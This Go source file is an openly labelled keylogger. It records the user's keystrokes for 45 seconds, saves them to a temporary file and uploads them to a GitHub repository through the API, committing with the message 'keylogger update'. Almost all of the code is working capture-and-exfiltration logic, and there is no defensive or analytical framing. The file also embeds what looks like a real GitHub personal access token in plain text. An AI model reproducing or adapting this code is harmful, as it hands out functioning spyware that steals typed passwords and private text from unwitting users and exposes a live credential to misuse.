package main

import (
	"context"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/eiannone/keyboard"
	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
)

func clearScreen() {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "linux", "darwin":
		cmd = exec.Command("clear")
	case "windows":
		cmd = exec.Command("cmd", "/c", "cls")
	default:
		panic("Plataforma não suportada")
	}

	cmd.Stdout = os.Stdout
	cmd.Run()
}

func main() {

	clearScreen()

	if err := keyboard.Open(); err != nil {
		panic(err)
	}
	defer func() {
		_ = keyboard.Close()
	}()

	var keysPressed []string

	timer := time.NewTimer(45 * time.Second)

	for {
		select {
		case <-timer.C:
			content := strings.Join(keysPressed, "")

			tempFile, err := ioutil.TempFile("", "keys")
			if err != nil {
				log.Fatalf("Error creating temporary file: %v", err)
			}
			defer os.Remove(tempFile.Name())

			if _, err := tempFile.Write([]byte(content)); err != nil {
				log.Fatalf("Error creating temporary file: %v", err)
			}

			token := "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"
			ts := oauth2.StaticTokenSource(
				&oauth2.Token{AccessToken: token},
			)
			tc := oauth2.NewClient(context.Background(), ts)

			client := github.NewClient(tc)

			fileContent, err := ioutil.ReadFile(tempFile.Name())
			if err != nil {
				log.Fatalf("Error reading the temporary file: %v", err)
			}

			repoOwner := "simplyYan"
			repoName := "simplyYan"
			filePath := "klg.txt"
			fileMessage := "keylogger update"

			_, _, err = client.Repositories.CreateFile(context.Background(), repoOwner, repoName, filePath, &github.RepositoryContentFileOptions{
				Message: &fileMessage,
				Content: fileContent,
			})
			if err != nil {
				log.Fatalf("Error creating file on GitHub: %v", err)
			}

			fmt.Println("File successfully created on GitHub!")
			return
		default:

			char, _, err := keyboard.GetKey()
			if err != nil {
				panic(err)
			}

			keysPressed = append(keysPressed, string(char))
		}
	}
}
